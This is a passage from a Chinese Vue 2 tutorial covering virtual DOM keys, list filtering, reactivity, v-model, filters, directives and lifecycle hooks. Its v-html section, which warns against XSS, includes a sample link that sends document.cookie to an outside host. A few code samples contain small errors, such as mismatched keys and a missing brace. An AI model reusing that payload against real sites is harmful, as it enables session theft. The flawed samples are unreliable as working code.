      <li class="item">Item 2</li>
      <li class="item">Item 3</li>
    </ul>
    <div>Hello World</div>
</div> 
```

我们用 `JavaScript` 对象来表示 `DOM` 节点，使用对象的属性记录节点的类型、属性、子节点等。

```js
/**
 * Element virdual-dom 对象定义
 * @param {String} tagName - dom 元素名称
 * @param {Object} props - dom 属性
 * @param {Array<Element|String>} - 子节点
 */
function Element(tagName, props, children) {
    this.tagName = tagName;
    this.props = props;
    this.children = children;
    // dom 元素的 key 值，用作唯一标识符
    if (props.key) {
        this.key = props.key
    }
}
function el(tagName, props, children) {
    return new Element(tagName, props, children);
}
```

构建虚拟的  `DOM`  ，用 javascript 对象来表示

```js
let ul = el('div', { id: 'Virtual DOM' }, [
    el('p', {}, ['Virtual DOM']),
    el('ul', { id: 'list' }, [
        el('li', { class: 'item' }, ['Item 1']),
        el('li', { class: 'item' }, ['Item 2']),
        el('li', { class: 'item' }, ['Item 3'])
    ]),
    el('div', {}, ['Hello, World'])
])
```

现在 `ul` 就是我们用 `JavaScript` 对象表示的 `DOM` 结构，我们输出查看 `ul` 对应的数据结构如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/9fb2a6336a61477c8ea39677716d1f52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


**（2）**将用 js 对象表示的虚拟 DOM 转换成真实 DOM：需要用到 js 原生操作 DOM 的方法。

```js
/**
 * render 将virdual-dom 对象渲染为实际 DOM 元素
 */
Element.prototype.render = function () {
    // 创建节点
    let el = document.createElement(this.tagName);

    let props = this.props;
    // 设置节点的 DOM 属性
    for (let propName in props) {
        let propValue = props[propName];
        el.setAttribute(propName, propValue)
    }

    let children = this.children || []
    for (let child of children) {
        let childEl = (child instanceof Element)
        ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
        : document.createTextNode(child) // 如果是文本，就构建文本节点

        el.appendChild(childEl);
    }

    return el;
}
```

我们通过查看以上 `render` 方法，会根据 `tagName` 构建一个真正的 `DOM` 节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。

我们将构建好的 `DOM` 结构添加到页面 `body` 上面，如下：

```js
let ulRoot = ul.render();
document.body.appendChild(ulRoot);
```

这样，页面 `body` 里面就有真正的 `DOM` 结构，效果如下图所示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/41bf566f214f4c1f943b9a3dddfc6f19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_19,color_FFFFFF,t_70,g_se,x_16)




> 我们知道虚拟 DOM 的好处和虚拟 DOM 的实现后就要讲讲 key 的作用了。
>
> 贴一下上面实现地完整代码

```html
<script>
    /**
         * Element virdual-dom 对象定义
         * @param {String} tagName - dom 元素名称
         * @param {Object} props - dom 属性
         * @param {Array<Element|String>} - 子节点
         */
    function Element(tagName, props, children) {
        this.tagName = tagName;
        this.props = props;
        this.children = children;
        // dom 元素的 key 值，用作唯一标识符
        if (props.key) {
            this.key = props.key
        }
    }

    function el(tagName, props, children) {
        return new Element(tagName, props, children);
    }

    let ul = el('div', { id: 'Virtual DOM' }, [
        el('p', {}, ['Virtual DOM']),
        el('ul', { id: 'list' }, [
            el('li', { class: 'item' }, ['Item 1']),
            el('li', { class: 'item' }, ['Item 2']),
            el('li', { class: 'item' }, ['Item 3'])
        ]),
        el('div', {}, ['Hello, World'])
    ])

    /**
             * render 将virdual-dom 对象渲染为实际 DOM 元素
             */
    Element.prototype.render = function () {
        // 创建节点
        let el = document.createElement(this.tagName);

        let props = this.props;
        // 设置节点的 DOM 属性
        for (let propName in props) {
            let propValue = props[propName];
            el.setAttribute(propName, propValue)
        }

        let children = this.children || []
        for (let child of children) {
            let childEl = (child instanceof Element)
            ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
            : document.createTextNode(child) // 如果是文本，就构建文本节点

            el.appendChild(childEl);
        }

        return el;
    }

    let ulRoot = ul.render();
    document.body.appendChild(ulRoot);
    console.log(ul);
</script>
```







#### **1.13.3.3 虚拟DOM中key的作用**

key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

* 旧虚拟DOM中找到了与新虚拟DOM相同的key：
  * ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
  * ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
* 旧虚拟DOM中未找到与新虚拟DOM相同的key
  * 创建新的真实DOM，随后渲染到到页面。



> 好了，我们知道了最简单的key的原理，如果要继续研究下去就要涉及到vue的核心之一-Diff算法，后面会详细介绍。





### 1.13.4 key的使用（用原理解析）

**若对数据进行：逆序添加、逆序删除等破坏顺序操作：**

会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。



> 案例

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <button @click.once="add">添加一个老刘</button>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
            <input type="text">
        </li>
    </ul>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false

	new Vue({
		el: '#root',
		data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			]
		},
		methods: {
			add() {
				const p = { id: '004', name: '老刘', age: 40 }
				this.persons.unshift(p)
			}
		},
	});
</script>
```

> 解释：

初始数据

persons: [
		{ id: '001', name: '张三', age: 18 },
		{ id: '002', name: '李四', age: 19 },
		{ id: '003', name: '王五', age: 20 }
]

**vue根据数据生成虚拟 DOM**

初始虚拟 DOM 

```html
<li key='0'>张三-18<input type="text"></li>
<li key='1'>李四-19<input type="text"></li>
<li key='2'>王五-20<input type="text"></li>
```

**将虚拟 DOM 转为 真实 DOM** 

![在这里插入图片描述](https://img-blog.csdnimg.cn/ac320c177da8496785f7b94e54dd938a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_13,color_FFFFFF,t_70,g_se,x_16)


`this.persons.unshift({ id: '004', name: '老刘', age: 40 })`

在 persons 数组最前面添加上 { id: '004', name: '老刘', age: 40 }

新数据：

persons: [

​		{ id: '004', name: '老刘', age: 40 },

​		{ id: '001', name: '张三', age: 18 },
​		{ id: '002', name: '李四', age: 19 },
​		{ id: '003', name: '王五', age: 20 }
]

**vue根据数据生成虚拟 DOM**

新虚拟 DOM

```html
<li key='0'>老刘-30<input type="text"></li>
<li key='1'>张三-18<input type="text"></li>
<li key='3'>李四-19<input type="text"></li>
<li key='4'>王五-20<input type="text"></li>
```

**将虚拟 DOM 转为 真实 DOM** 

![在这里插入图片描述](https://img-blog.csdnimg.cn/2ec092bf1dca430c9d9b7bf932587501.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_15,color_FFFFFF,t_70,g_se,x_16)




因为老刘被插到第一个，重刷了 key 的值，vue Diff 算法 根据 key 的值 判断 虚拟DOM 全部发生了改变，然后全部重新生成新的 真实 DOM。实际上，张三，李四，王五并没有发生更改，是可以直接复用之前的真实 DOM，而因为 key 的错乱，导致要全部重新生成，造成了性能的浪费。

> 来张尚硅谷的图

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec80a7ae139642d09d70e77ca37e0a52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




**如果结构中还包含输入类的DOM：**

会产生错误DOM更新 ==> 界面有问题。

> 这回造成的就不是性能浪费了，会直接导致页面的错误

![在这里插入图片描述](https://img-blog.csdnimg.cn/c89eb1802c7a4698ba5b14ab0ab654d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_16,color_FFFFFF,t_70,g_se,x_16)




### 1.13.5 key的总结

* 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
* 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的



> 来张尚硅谷的图，正经使用 key

![在这里插入图片描述](https://img-blog.csdnimg.cn/e5b3f8a66d7441e5bcff0a2525266759.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)



## 1.14 列表过滤、排序

- 过滤算法

```js
// 案例：如果名字中包含val 则留下

keyword: {                    
    // 当keyword修改时 过滤列表更新！
    handler(val) {
        // 过滤算法
        this.filPersons = this.persons.filter((p)=> {
            return p.name.indexOf(val) != -1;
        })
    },

    immediate: true, // 立即执行
}

// 1、字符串.indexOf('') 返回0
// 2、indexOf：用于字符串判断！！！！
// 3、立即执行是为了开始显示全部
```

```js
// 案例：如果id匹配则留下
            this.todoList = this.todoList.filter((todo)=> todo.id != id);
```



- 排序算法

```js
computed: {
    filPersons() {

        const arr = this.persons.filter((p)=> {
            // 这里直接传keyword
            return p.name.indexOf(this.keyword) != -1;
        }) 

        // 处理排序问题
        if(this.type) {
            arr.sort((a,b)=> {
                return this.type == 1 ? a.age - b.age : b.age - a.age;
            })
        }

        return arr;
    }
}

// 1、return a-b：升序  b-a：降序
// 2、sort()直接改变原数组
```

### 1.14.1 watch实现

实现过滤

```html
<body>
    <div class="root">
        <input type="text" placeholder="搜索框" v-model="keyword">
        <ul>
            <li v-for="(item,index) of filPersons" :key="item.id">
                姓名: {{item.name}}  年龄: {{item.age}}
            </li>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        // 用watch实现列表过滤
        new Vue({
            el: '.root',
            
            data: {
                persons:[
                    {id:'001',name:'马冬梅',age:19,sex:'女'},
                    {id:'002',name:'周冬雨',age:20,sex:'女'},
                    {id:'003',name:'周杰伦',age:21,sex:'男'},
                    {id:'004',name:'温兆伦',age:22,sex:'男'}
                ],

                filPersons: [], // 过滤列表

                keyword: '' // 对应input.value
            },

            watch: {
                keyword: {                    
                    // 当keyword修改时 过滤列表更新！
                    handler(val) {
                        // 过滤算法
                        this.filPersons = this.persons.filter((p)=> {
                            return p.name.indexOf(val) != -1;
                        })
                    },

                    immediate: true,
                }
            }

        })
    </script>
</body>
```



### 1.14.2 computed实现（推荐）

实现过滤

```js
computed: {
    filPersons() {
        return this.persons.filter((p)=> {
            // 这里直接传keyword
            return p.name.indexOf(this.keyword) != -1;
        }) 
    }
}
```







## 1.15 监测数据原理

### 1.15.1 监测对象

- 更新对象失败案例

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <button @click="updateMei">更新马冬梅的信息</button>
    <ul>
        <li v-for="(p,index) of persons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul> 
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    const vm = new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001',name:'马冬梅',age:30,sex:'女'},
                {id:'002',name:'周冬雨',age:31,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:19,sex:'男'}
            ]
        },
        methods: {
            updateMei(){
                // this.persons[0].name = '马老师' //奏效
                // this.persons[0].age = 50 //奏效
                // this.persons[0].sex = '男' //奏效
                this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                // this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
            }
        }
    }) 

</script>
```

点击更新马冬梅的信息，马冬梅的数据并没有发生改变。

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f16b316d8824ca897e55c70884463de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


我们来看看控制台：
![在这里插入图片描述](https://img-blog.csdnimg.cn/145a2298bba942c78f8d23f03fb21bdf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。



- **监测对象原理**

> 代码

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            name:'浙江师范大学',
            address:'金华',
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                friends:[
                    {name:'jerry',age:35}
                ]
            }
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/024cbd8a706c451e9a1f6cc3916e426e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


> 讲一下解析模板后面的操作---》调用 set 方法时，就会去解析模板----->生成新的虚拟 DOM----->新旧DOM 对比 -----> 更新页面

模拟一下 vue 中的 数据监测

```html
<script type="text/javascript" >

    let data = {
        name:'尚硅谷',
        address:'北京',
    }

    //创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data)		
    console.log(obs)	

    //准备一个vm实例对象
    let vm = {}
    vm._data = data = obs

    function Observer(obj){
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k) => {
            Object.defineProperty(this, k, {
                get() {
                    return obj[k]
                },
                set(val) {
                    console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                    obj[k] = val
                }
            })
        })
    }
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/250a6e7fa0da45608997f2688e143d45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)



### 1.15.2 $set的使用

当组件需要更新或定义**组件中的对象中的属性**时，需要用到$set这个API



**Vue.set 的使用**： this为组件本身

` this.$set(对象名,'键','值')`

`this.$set(target，propertyName，value)` 



> 代码

```html
<!-- 准备好一个容器-->
<div id="root">
    <h1>学生信息</h1>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            student:{
                name:'tom',
                age:18,
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            addSex(){
                // Vue.set(this.student,'sex','男')
                this.$set(this.student,'sex','男')
            }
        }
    })
</script>
```





### 1.15.3 监测数组

> 先写个代码案例

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>爱好</h2>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h2>朋友们</h2>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2f270e6fed4408fb6709e960aea7953.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


> 所以我们通过 vm._data.student.hobby[0] = 'aaa' // 不奏效
>
> vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新

![在这里插入图片描述](https://img-blog.csdnimg.cn/0e4c3d70f3e3492baaa2f391b0c26ec0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)

既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？

vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。

vue官网的解释：

![在这里插入图片描述](https://img-blog.csdnimg.cn/b003a83d94dd44e0ae93a87da8ab43d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


 **总结：**

Vue监视数据的原理：

* vue会监视data中所有层次的数据

* 如何监测对象中的数据？

  通过setter实现监视，且要在new Vue时就传入要监测的数据。

  * 对象中后追加的属性，Vue默认不做响应式处理

  * 如需给后添加的属性做响应式，请使用如下API：

    Vue.set(target，propertyName/index，value) 或 

    vm.$set(target，propertyName/index，value)

* 如何监测数组中的数据？

  通过包裹数组更新元素的方法实现，本质就是做了两件事：

  * 调用原生对应的方法对数组进行更新
  * 重新解析模板，进而更新页面

* 在Vue修改数组中的某个元素一定要用如下方法：

  * 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  * Vue.set() 或 vm.$set()



> 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！





## 1.16 表单与v-model

### 1.16.1 input表单三种类型



1、`<input type="text"/>`

则v-model收集的是value值，用户输入的就是value值。

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                account:'',
                password:'',
                age:18,
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```



2、`<input type="radio"/>`
则v-model收集的是value值，且要给标签配置value值。

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                sex:'female'
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```



3、`<input type="checkbox"/>`

* 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
* 配置input的value属性:
  * v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  * **v-model的初始值是数组**，那么收集的的就是value组成的数组



```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                hobby:[],
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/74583240fa094967b19441921634b304.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




### 1.16.2 v-model的三个修饰符

1、lazy：失去焦点再收集数据

2、**number：输入字符串转为有效的数字**

3、trim：输入首尾空格过滤

```html
账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>

年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
```





## 1.17 过滤器

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

**语法：**

* 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
* 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{ fmtTime }}</h3>
    <!-- methods实现 -->
    <h3>现在是：{{ getFmtTime() }}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>
    <!-- 过滤器实现（传参） -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
    <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({
        el:'#root',
        data:{
            time:1621561377603, //时间戳
            msg:'你好，尚硅谷'
        },
        computed: {
            fmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        methods: {
            getFmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        //局部过滤器
        filters:{
            timeFormater(value, str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            }
        }
    })
</script>
```



> 备注：
>
> 1.过滤器也可以接收额外参数、多个过滤器也可以串联
>
> 2.并没有改变原本的数据, 是产生新的对应的数据





## 1.18 内置指令

### 1.17.1 v-text、v-html

1.作用：向其所在的节点中渲染文本内容。

2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```html
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>'
        }
    })
</script>
```

**v-html指令：**(使用的很少)

1.作用：向指定节点中渲染包含html结构的内容。

2.与插值语法的区别：

* v-html会替换掉节点中所有的内容，{{xx}}则不会。
* v-html可以识别html结构。

3.严重注意：v-html有安全性问题！！！！

* 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
* 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```js
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```



### 1.17.2 v-cloak、v-once

**v-cloak：**

* 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
* 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<style>
    [v-cloak]{
        display:none;
    }
</style>
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
```

**v-once指令：**(用的少)

* v-once所在节点在初次动态渲染后，就视为静态内容了。
* 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{ n }}</h2>
    <h2>当前的n值是:{{ n }}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

**v-pre指令：**(比较没用)

* 跳过其所在节点的编译过程
* 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 >当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```





## 1.19 自定义指令

注意点：

1、`big() {}`：函数内`this`指向`window`

2、如果命名为`v-big-number`，则对象用字符串形式：`'big-number'() {}`



### 1.19.1 自定义指令简易版

需求：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

函数执行：**1.指令与元素成功绑定时 2.指令所在的模板被重新解析时**

```html
<body>
    <div class="root">
        <div>当前的n值为{{n}}</div><br>
        <div>放大10倍的n值为<span v-big="n"></span></div>
        <button @click="n++">点击n+1</button>
    </div>
    <script>
        new Vue({
            el: '.root',

            data: {
                n: 1, 
            },

            // 定义自定义指令
            directives: {
                // 1.指令与元素成功绑定时 2.指令所在的模板被重新解析时
                big(element,binding) {
                    // console.log(element,binding);  绑定元素和v-big="n"

                    element.innerHTML = binding.value * 10;
                }
            }
        })
    </script>
</body>
```



### 1.19.2 自定义指令通用版

需求：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

配置对象中常用的3个回调：

* bind：指令与元素成功绑定时调用。

* inserted：指令所在元素被插入页面时调用。

* update：指令所在模板结构被重新解析时调用。

```html
<div id="root">
    <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name:'尚硅谷',
            n:1
        },
        directives: {
            big (element,binding){
                console.log('big',this) //注意此处的this是window
                // console.log('big')
                element.innerText = binding.value * 10
            },
            fbind: {
                //指令与元素成功绑定时（一上来）
                bind (element,binding){
                    element.value = binding.value
                },
                //指令所在元素被插入页面时
                inserted (element,binding){
                    element.focus()
                },
                //指令所在的模板被重新解析时
                update (element,binding){
                    element.value = binding.value
                }
            }
        }
    })
    
</script>    
```



### 1.19.3 全局自定义指令

```html
<div id="root">
    <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    //定义全局指令
    Vue.directive('fbind', {
        // 指令与元素成功绑定时（一上来）
        bind(element, binding){
            element.value = binding.value
        },
        // 指令所在元素被插入页面时
        inserted(element, binding){
            element.focus()
        },
        // 指令所在的模板被重新解析时
        update(element, binding){
            element.value = binding.value
        }
    })
    
    new Vue({
        el:'#root',
        data:{
            name: '尚硅谷',
            n: 1
        }
    })

</script>
```



## 1.20 生命周期

Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -> 渲染、更新 -> 渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。 



### 1.20.1 生命周期函数

vue在工作的某个阶段会执行的函数 我们称为生命周期函数

常用的生命周期钩子：

​            1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。

​            2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

所有的生命周期函数在后面

```html
<body>
    <div class="root">
        <h2 :style="{opacity}">生命周期</h2>
        <button @click="$destroy()">点击停止</button>
    </div>
    <script>
        // vue在工作的某个阶段会执行的函数 我们称为生命周期函数

        new Vue({
            el: '.root',

            data: {
                opacity: 1,
            },

            // 当vue第一次把真实dom挂载到页面时执行（所以只执行一次）
            mounted() {
                // 设置一个定时器  给vm内置一个
                this.timer = setInterval(()=> {
                    this.opacity -= 0.01;

                    if(this.opacity <= 0) this.opacity = 1;
                },16)
            },

            // 当vm即将销毁时执行（只执行一次）
            beforeDestroy() {
                // 清除定时器
                clearInterval(this.timer);
            },
        })
    </script>
</body>
```



### 1.20.1 完整生命周期

**1、完整生命周期图解：**

![在这里插入图片描述](https://img-blog.csdnimg.cn/e4a8169c832443f2a78c6a1ae42a87b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)

**2、所有的生命周期函数：**



1. **beforeCreate（创建前）**：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event/watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。
2. **created（创建后）**：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，**但是此时渲染得节点还未挂载到 DOM**，所以不能访问到 `$el`属性。



